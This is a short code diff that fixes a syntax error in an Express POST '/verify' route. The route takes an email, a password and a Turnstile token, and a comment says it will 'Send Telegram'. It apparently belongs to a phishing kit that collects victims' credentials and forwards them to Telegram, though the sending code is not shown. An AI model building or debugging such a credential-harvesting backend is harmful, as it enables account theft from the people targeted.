@@ -25,7 +25,7 @@ app.get('/', (req, res) => {
 });
 
 // Verify Turnstile and Send Telegram
-app.post('/verify', async (req, res) {
+app.post('/verify', async (req, res) => {
     console.log("Received verification request");
     const { email, password, turnstileToken } = req.body;
 
